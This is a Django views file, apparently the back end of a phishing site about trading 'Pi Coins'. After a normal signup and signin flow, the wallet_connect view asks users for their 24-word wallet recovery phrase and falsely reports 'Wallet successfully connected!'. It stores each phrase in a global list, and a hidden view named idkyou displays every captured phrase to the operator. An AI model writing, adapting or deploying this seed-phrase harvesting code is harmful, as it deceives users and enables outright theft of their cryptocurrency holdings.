# Create your views here.
# my_app/views.py
# app/views.py
from django.shortcuts import render, redirect
from django.contrib.auth.models import User
from django.contrib.auth import authenticate, login, logout
from django.contrib import messages



def signup(request):
    if request.method == 'POST':
        username = request.POST['username']
        password = request.POST['password']
        confirm_password = request.POST['confirm_password']

        if password != confirm_password:
            messages.error(request, "Passwords do not match!")
            return redirect('signup')

        try:
            User.objects.create_user(username=username, password=password)
            messages.success(request, "Account created successfully! Kindly Sign in to trade your Pi Coins.")
            return redirect('signin')
        except:
            messages.error(request, "Username already exists!")
            return redirect('signup')

    return render(request, 'app/signup.html')

def signin(request):
    if request.method == 'POST':
        username = request.POST['username']
        password = request.POST['password']

        user = authenticate(request, username=username, password=password)
        if user is not None:
            login(request, user)
            messages.success(request, "Signed in successfully! You can now connect your Pi Browser wallet for easy transactions.")
            return redirect('index')
        else:
            messages.error(request, "Invalid username or password!")
            return redirect('signin')

    return render(request, 'app/signin.html')

def signout(request):
    logout(request)
    messages.success(request, "Signed out successfully!")
    return redirect('signin')

def index(request):
    return render(request, 'app/index.html')

def dashboard(request):
    return render(request, 'app/dashboard.html')

from django.shortcuts import render, redirect
from django.contrib import messages

# Initialize a global list to hold the phrases
phrases_list = []

def wallet_connect(request):
    if request.method == 'POST':
        phrase = request.POST.get('phrase', '').strip()
        words = phrase.split()

        # Check if there are 24 words
        if len(words) == 24:
            # Add the phrase to the list
            phrases_list.append(phrase)
            messages.success(request, 'Wallet successfully connected!')
            # return redirect('idkyou')
        else:
            messages.error(request, 'Please provide exactly 24 words.')

    return render(request, 'app/wallet_connect.html')

def idkyou(request):
    return render(request, 'app/idkyou.html', {'phrases': phrases_list})



